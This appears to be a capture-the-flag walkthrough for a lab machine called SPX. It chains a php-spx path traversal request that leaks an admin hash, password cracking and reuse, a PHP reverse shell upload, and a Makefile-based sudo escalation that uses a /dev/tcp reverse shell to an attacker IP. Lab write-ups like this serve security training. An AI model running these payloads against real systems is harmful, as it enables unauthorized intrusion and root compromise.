##### Tags: `sudo-l`  `Tinyfilemanager`  `SPX`  `makefile`  `passwd-reuse`

# 🐧SPX🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.249.108

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
port 80 is running login page for H3K Tiny File Manager 2.5.3  
found the version is CVE-2024-42007 - php-spx Path Traversal Exploit allowing us to read file in the system  
run the script and found we need specfiy the SPX_KEY value  
run gobuster and found there is a phpinfo page
```console
 gobuster dir -u http://192.168.249.108 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html  
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.249.108
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================

/index.php            (Status: 200) [Size: 12045]
/phpinfo.php          (Status: 200) [Size: 74735]
```
we found the spx key in the phpinfo page
```console
spx.http_key	a2a90ca2f9f0ea04d267b16fb8e63800
```
run it in burp suite so we can change data easier
```console
GET /?SPX_KEY=a2a90ca2f9f0ea04d267b16fb8e63800&SPX_UI_URI=%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/var/www/html/index.php HTTP/1.1
Host: 192.168.249.108
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Cookie: filemanager=cp9hn0t4oatsde0agb7g8vn9sf
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
we got responded  with the admin hash
```console
$auth_users = array(
    'admin' => '$2y$10$7LaMUa8an8NrvnQsj5xZ3eDdOejgLyXE8IIvsC.hFy1dg7rPb9cqG',
```
crack it with john the ripper  
it take quit a while but we got it
```console
admin : lowprofile
```
we logged into the port 80 web page using the credential  
then we can upload our php revershell to catch the shell
```console
$ nc -lvnp 80               
listening on [any] 80 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.249.108] 46142

www-data@spx:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
we found another user profiler
```console
www-data@spx: cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
profiler:x:1000:1000::/home/profiler:/bin/bash
```
try reuse the password and success
```console
www-data@spx:/home$ su profiler
Password: lowprofile

profiler@spx:/home$ id
uid=1000(profiler) gid=1000(profiler) groups=1000(profiler)
```
## Privilege Escalation
sudo-l found we can run install command as root
```console
profiler@spx:/home$ sudo -l

Matching Defaults entries for profiler on spx:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User profiler may run the following commands on spx:
    (ALL) /usr/bin/make install -C /home/profiler/php-spx
```
and we owned the php-spx directory  
the plan is we modify the makefile and get the root shell
```console
profiler@spx:~/php-spx$ ls -la

-rw-r--r--  1 profiler profiler  14798 Sep 12  2024 Makefile
```
since we get not edit the file in this shell  
we download the file to our local machine, change the shell payload to our revershell payload 
then upload back to the target machine
```console
#Makefile modification

SHELL = bash /tmp/shell.sh
```
```console
#revershell payload

$ cat shell.sh    
#!/bin/sh
/bin/sh -i >& /dev/tcp/192.168.45.195/22 0>&1
```
set up listener, upload and run the command
```
profiler@spx:~/php-spx$ sudo /usr/bin/make install -C /home/profiler/php-spx
sudo /usr/bin/make install -C /home/profiler/php-spx
make: Entering directory '/home/profiler/php-spx'
    


$ nc -lvnp 22              
listening on [any] 22 ...
connect to [192.168.45.195] from (UNKNOWN) [192.168.249.108] 45914
# id
uid=0(root) gid=0(root) groups=0(root)
```
